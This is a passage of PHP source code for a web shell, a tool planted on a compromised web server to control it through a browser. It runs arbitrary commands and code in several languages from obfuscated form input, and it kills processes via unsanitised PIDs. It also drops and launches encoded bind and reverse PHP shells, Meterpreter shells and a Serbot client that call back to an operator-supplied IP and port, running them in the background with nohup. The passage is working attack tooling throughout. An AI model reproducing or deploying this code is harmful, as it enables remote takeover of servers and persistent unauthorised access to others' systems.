						0 => array("pipe", "r"),
						1 => array("pipe", "w"),
						2 => array("pipe", "w"),
					),
					$pipes
				);
	
				if ($process !== false)
				{
					$stdout = stream_get_contents($pipes[1]);
					$stderr = stream_get_contents($pipes[2]);
					fclose($pipes[1]);
					fclose($pipes[2]);
					proc_close($process);
		
					if ($stderr != "")
					{
						$response = $stderr;
					}
					else
					{
						$response = $stdout;
					}
				}
				else
				{
					$response = "Fail";
				}
			}
			
						
			echo "<table class='flat-table flat-table-1'>";
			echo "<tr><td>".$decCommand."</td>";
			echo "<td><pre>";
			echo strip_tags($response);
			echo "</pre></td></tr>";
			echo "</table>";
		}
					
		$parts = explode(" ", $decCommand);
		if($parts[0] == "cd")
		{
			if(file_exists($parts[1]))
			{
				$_SESSION["directory"] = $parts[1];
				echo '<meta http-equiv="refresh" content="0" />';			
			}
			else
			{
				echo "<pre>Directory does not exist</pre>";
			}		
		}
	}
}
}
?>


<br><br><h3><A NAME='Eval' href="#Eval">Eval</A></h3>

<form action="#Eval" method="POST">
	<textarea name="eval" style="width: 400px; height: 100px;"></textarea><br>
	<select name="language">
		<?php
		if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
		{
			if(command_exists("python") != "" && strpos(command_exists("python"), "INFO:")===false)
			{
				echo "<option value='python'>Python</option>";
			}
			
			if(command_exists("perl") != ""  && strpos(command_exists("perl"), "INFO:")===false)
			{
				echo "<option value='perl'>Perl</option>";
			}			

			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				echo "<option value='batch'>Batch</option>";
				echo "<option value='powershell'>Powershell</option>";
			}
			else
			{
				echo "<option value='bash'>Bash</option>";
			}			
			
			if(command_exists("ruby") != ""  && strpos(command_exists("python"), "INFO:")===false)
			{
				echo "<option value='ruby'>Ruby</option>";		
			}			
			
			if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN')
			{
				if(command_exists("gcc") != "")
				{			
					echo "<option value='c'>C</option>";
				}
							
				if(command_exists("g++") != "")
				{
					echo "<option value='cpp'>C++</option>";
				}
			}
		}
		?>
	</select>
	<input type="submit" name="run" value="run" onclick="return xorencr2(this.form, this.form.language, this.form.eval);"/>
</form>

<?php
if(isset($_POST["run"]))
{
	$decEval = unxor_this($_POST["eval"]);
	
	if($_POST["language"] == "python")
	{
		if(command_exists("python") != "")
		{
			$filename = rand(1,1000) . ".py";
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}			
			else
			{
				$filename = "/tmp/".$filename;
			}

			file_put_contents("$filename", $decEval);
			$command = "python $filename 2>&1";
			evalRel($command);
			unlink("$filename");
		}
	}
	
	if($_POST["language"] == "bash")
	{
		if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$filename = rand(1,1000) . ".sh";
			$filename = "/tmp/".$filename;
			file_put_contents($filename, $decEval);
			shell_exec("chmod 777 $filename");
			$command = "./$filename 2>&1";
			evalRel($command);
			unlink($filename);
		}
	}	
	
	if($_POST["language"] == "perl")
	{
		if(command_exists("perl") != "")
		{
			$filename = rand(1,1000) . ".pl";
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}
			else
			{
				$filename = "/tmp/".$filename;
			}			
					
			file_put_contents($filename, $decEval);
			$command = "perl $filename 2>&1";
			evalRel($command);
			unlink($filename);
		}
	}
	
	if($_POST["language"] == "ruby")
	{
		if(command_exists("ruby") != "")
		{
			$filename = rand(1,1000) . ".rb";
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}			
			else
			{
				$filename = "/tmp/".$filename;
			}
			
			file_put_contents($filename, $decEval);
			$command = "ruby $filename 2>&1";
			evalRel($command);
			unlink($filename);
		}
	}
	
	
	if($_POST["language"] == "c")
	{
		if(command_exists("gcc") != "")
		{
			$filename = rand(1,1000);
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}
			else
			{
				$filename = "/tmp/".$filename;
			}			
			
			$extension = "c";
			file_put_contents("$filename.$extension", $decEval);
			echo shell_exec("gcc -o $filename $filename.$extension 2>&1");
			$command = "./$filename";
			evalRel($command);
			unlink($filename);
		}
	}
	
	if($_POST["language"] == "cpp")
	{
		if(command_exists("g++") != "")
		{
			$filename = rand(1,1000);
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}
			else
			{
				$filename = "/tmp/".$filename;
			}
			
			$extension = "cpp";
			file_put_contents("$filename.$extension", $decEval);
			echo shell_exec("g++ -o $filename $filename.$extension 2>&1");
			$command = "./$filename";
			evalRel($command);
			unlink($filename);
		}
	}
	
	if($_POST["language"] == "powershell")
	{
		if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			if(command_exists("powershell") != "")
			{
				$filename = rand(1,1000);
				$filename = "%temp%\\".$filename;
				$extension = "ps1";
				file_put_contents("$filename.$extension", $decEval);
				$command = "Powershell.exe -executionpolicy remotesigned -File $filename.$extension";
				evalRel($command);
				unlink("$filename.$extension");
			}
		}
		else
		{
			echo "<p class='danger'>This ain't no Windows machine mate!</p>";
		}
	}		
	
	if($_POST["language"] == "batch")
	{
		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$filename = rand(1,1000);
			$filename = "/tmp/".$filename;
			$extension = "bat";
			file_put_contents("$filename.$extension", $decEval);
			$command = "$filename.$extension";
			evalRel($command);
			unlink("$filename.$extension");
		}
	}		
}

if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
{
echo "
<br><br><h3><A NAME='Process Manager' href=\"#Process Manager\">Process Manager</A></h3>";

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
{
	if(isset($_GET["kill"]))
	{
		if ($shell_exec == True)
		{
			$kill = shell_exec("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}			
		else if($exec == True)
		{
			$kill = exec("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}
		else if($popen == True)
		{
			$pid = popen("taskkill /F /PID " . $_GET["kill"] . " 2>&1","r");
			$kill = fread($pid, 2096);
			pclose($pid);
		}
		else if($proc_open == true)
		{
			$oprocess = proc_open(
				"taskkill /F /PID " . $_GET["kill"] . " 2>&1",
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($oprocess !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($oprocess);

				if ($stderr == "")
				{
					$kill = $stdout;
				}
				else
				{
					$kill = "Fail";
				}
			}
			else
			{
				$kill = "Fail";
			}
		}
		else
		{
			$kill = "Fail";
		}

		if(strpos($kill, "SUCCESS")!==false)
		{
			echo "Success";
		}			
		else
		{
			echo "Fail";
		}
	}

	if ($shell_exec == True)
	{
		$process_list = shell_exec("tasklist");
	}
	else if ($exec == True)
	{
		$process_list = exec("tasklist");
	}
	else if($popen == True)
	{
		$pid = popen("tasklist","r");
		$process_list = fread($pid, 2096);
		pclose($pid);
	}
	else if($proc_open == true)
	{
		$oprocess = proc_open(
			"tasklist",
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);
	
		if ($oprocess !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($oprocess);

			if ($stderr == "")
			{
				$process_list = $stdout;
			}
			else
			{
				$process_list = "Fail";
			}
		}
		else
		{
			$process_list = "Fail";
		}
	}
	else
	{
		$process_list = "Fail";
	}

	$processes = explode("\n", $process_list);

	echo "<table class='flat-table flat-table-3'>
		<tr>
			<th>Name</th>
			<th>Pid</th>
			<th>Kill</th>
		</tr>";
	
	$i = 0;
	foreach($processes as $process)
	{
		if($i > 2)
		{
			$parts = array_filter(explode(" ", $process));
			$parts = array_values($parts);
			if(isset($parts[0]) && strpos($parts[0], ".")!==false)
			{
				$name = $parts[0];
				$pid = $parts[1];
				echo "
				<tr>
					<td>$name</td>
					<td>$pid</td>
					<td><a href='?kill=$pid#Process Manager'>Kill</a></td>
				</tr>";
			}
		}
		$i++;
	}
	echo "</table>";
}
else
{
	if(isset($_GET["kill"]))
	{
		$pid = $_GET["kill"];
		
		if ($shell_exec == True)
		{
			$output = shell_exec("kill $pid 2>&1");
		}		
		else if($exec == True)
		{
			$output = exec("kill $pid 2>&1");
		}
		else if($popen == True)
		{
			$pid = popen("kill $pid 2>&1","r");
			$output = fread($pid, 2096);
			pclose($pid);
		}
		else if($proc_open == true)
		{
			$oprocess = proc_open(
				"kill $pid 2>&1",
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($oprocess !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($oprocess);

				if ($stderr == "")
				{
					$output = $stdout;
				}
				else
				{
					$output = "Fail";
				}
			}
			else
			{
				$output = "Fail";
			}
		}
		else
		{
			$output = "Fail";
		}		

		if(empty($output))
		{
			echo "Success";
		}		
		else
		{
			echo "Fail";
		}
	}

	if ($shell_exec == True)
	{
		$process_list = shell_exec("ps aux");
	}
	else if ($exec == True)
	{
		$process_list = exec("ps aux");
	}
	else if($popen == True)
	{
		$pid = popen("ps aux","r");
		$process_list = fread($pid, 2096);
		pclose($pid);
	}
	else if($proc_open == true)
	{
		$oprocess = proc_open(
			"ps aux",
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);
	
		if ($oprocess !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($oprocess);

			if ($stderr == "")
			{
				$process_list = $stdout;
			}
			else
			{
				$process_list = "Fail";
			}
		}
		else
		{
			$process_list = "Fail";
		}
	}
	else
	{
		$process_list = "Fail";
	}

	$processes = explode("\n", $process_list);

	echo "<table class='flat-table flat-table-3'>
		<tr>
			<th>User</th>
			<th>PID</th>
			<th>Process</th>
			<th>Kill</th>
		</tr>";

	$i = 0;
	foreach($processes as $process)
	{
		if($i > 0 && isset($process[0]))
		{
			$parts = array_filter(explode(" ", $process));
			$parts = array_values($parts);	
			$user = $parts[0];
			$pid = $parts[1];
			$command = array_pop($parts);
			
			echo "
			<tr>
				<td>$user</td>
				<td>$pid</td>
				<td>$command</td>
				<td><a href='?kill=$pid#Process Manager'>Kill</a></td>
			</tr>";
		}
		$i++;
	}
	echo "</table>";
}
}
?>

<?php

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bps"))
{
	global $phpbindshell, $nohup;

	if(isset($_POST['bind_port']))
	{
		if ($_POST['bind_port'] != "")
		{
			$port = $_POST['bind_port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$phpbindshell = unsh3ll_this($phpbindshell);
	$phpbindshell = str_replace("\$port=4444;", "\$port=$port;", $phpbindshell);
	
	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $phpbindshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rps"))
{
	global $phpreverseshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$phpreverseshell = unsh3ll_this($phpreverseshell);
	$phpreverseshell = str_replace("\$port=4444;", "\$port=$port;", $phpreverseshell);
	$phpreverseshell = str_replace("\$ipaddr='192.168.1.104';", "\$ipaddr='".$_POST['ip']."';", $phpreverseshell);

	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $phpreverseshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bmps"))
{
	global $meterpreterbindshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$meterpreterbindshell = unsh3ll_this($meterpreterbindshell);
	$meterpreterbindshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterbindshell);
	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $meterpreterbindshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rmps"))
{
	global $meterpreterreverseshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$meterpreterreverseshell = unsh3ll_this($meterpreterreverseshell);
	$meterpreterreverseshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterreverseshell);
	$meterpreterreverseshell = str_replace("\$ip = '192.168.1.104';", "\$ip = '".$_POST['ip']."';", $meterpreterreverseshell);
	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $meterpreterreverseshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "sc"))
{
	global $serbotclient, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$serbotclient = unsh3ll_this($serbotclient);
	$serbotclient = str_replace("port = 4444", "port = $port", $serbotclient);
	$serbotclient = str_replace("host = \"192.168.1.4\"", "host = \"".$_POST['ip']."\"", $serbotclient);
	$filename = rand(1,1000) . ".py";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $serbotclient);
	if ($nohup == True)
	{
		$command = "nohup python '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "python '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscan"))
{
	global $bpscan, $nohup;

	$bpscan = unsh3ll_this($bpscan);
	$bpscan = str_replace("'IP': '127.0.0.1',", "'IP': '".$_SERVER['SERVER_ADDR']."',", $bpscan);

	$filename = "bpscan.py";
	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = getcwd()."\\".$filename;
	}
	else
	{
		$filename = getcwd()."/".$filename;
	}

	file_put_contents($filename, $bpscan);
	if ($nohup == True)
	{
		$command = "nohup python '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "python '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

function zipWindows($zip_location, $folder)
{

global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;

$code = 'ArchiveFolder "' . $zip_location . '", "' . $folder . '"

Sub ArchiveFolder (zipFile, sFolder)

    With CreateObject("Scripting.FileSystemObject")
        zipFile = .GetAbsolutePathName(zipFile)
        sFolder = .GetAbsolutePathName(sFolder)

        With .CreateTextFile(zipFile, True)
            .Write Chr(80) & Chr(75) & Chr(5) & Chr(6) & String(18, chr(0))
        End With
    End With

    With CreateObject("Shell.Application")
        .NameSpace(zipFile).CopyHere .NameSpace(sFolder).Items

        Do Until .NameSpace(zipFile).Items.Count = _
                 .NameSpace(sFolder).Items.Count
            WScript.Sleep 1000 
        Loop
    End With

End Sub';


file_put_contents("zipFolder.vbs", $code);

if ($shell_exec == True)
{
	echo shell_exec("cscript //nologo zipFolder.vbs");
}
else if($exec == True)
{
	echo exec("cscript //nologo zipFolder.vbs");
}
else if($passthru == True)
{
	passthru("cscript //nologo zipFolder.vbs");
}
else if($system == True)
{
	system("cscript //nologo zipFolder.vbs");
}
else if($popen == true)
{
	$pid = popen("cscript //nologo zipFolder.vbs","r");
	while(!feof($pid))
	{
		echo fread($pid, 256);
		flush();
 		ob_flush();
		usleep(100000);
	}
	pclose($pid);
}
else if($proc_open == true)
{
	$process = proc_open(
		"cscript //nologo zipFolder.vbs",	
		array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w"),
		),
		$pipes
	);
	
	if ($process !== false)
	{
		$stdout = stream_get_contents($pipes[1]);
		$stderr = stream_get_contents($pipes[2]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
		
		if ($stderr != "")
		{
			echo $stderr;
		}
		else
		{
			echo $stdout;
		}
	}
	else
	{
		echo "Fail";
	}
}
else
{
	echo "Fail";
}
}
?>

<?php

if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
{
echo "
<br><br><h3><A NAME='Shells' href=\"#Shells\">Shells</A></h3>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=bmps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Bind Meterpreter PHP Shell</td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=rmps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Reverse Meterpreter PHP Shell</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=bps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Bind PHP Shell</td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='bind_port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=rps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Reverse PHP Shell</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=sc#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Serbot - Client</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>


<br><h3><A NAME='Tools' href=\"#Tools\">Tools</A></h3>

<table class='flat-table flat-table-1'>
	<tr>
		<td>Name</td>
		<td>Language</td>
		<td>Author</td>
		<td>Goal</td>
		<td>Description</td>
		<td>Action</td>
	</tr>
	<form action='?tool=bpscan#Tools' method='post' >
		<tr>
			<td>bpscan</td>
			<td>Python</td>
			<td>dotcppfile</td>
			<td>Find useable/unblocked ports.</td>
			<td>bpscan uses basic python socket binding with the service offered by canyouseeme.org to find useable/unblocked ports. The outputs are 'bpscan - errors.txt' and `bpscan - ports.txt' which will hold the found useable/unblocked ports. It uses 25 threads at a time but gets the job done so bare with it.</td>
			<td><input type='submit' value='Start' name='Start'/></td>
		</tr>
	</form>
</table>
";
}
?>

</center>
</body>
</html>
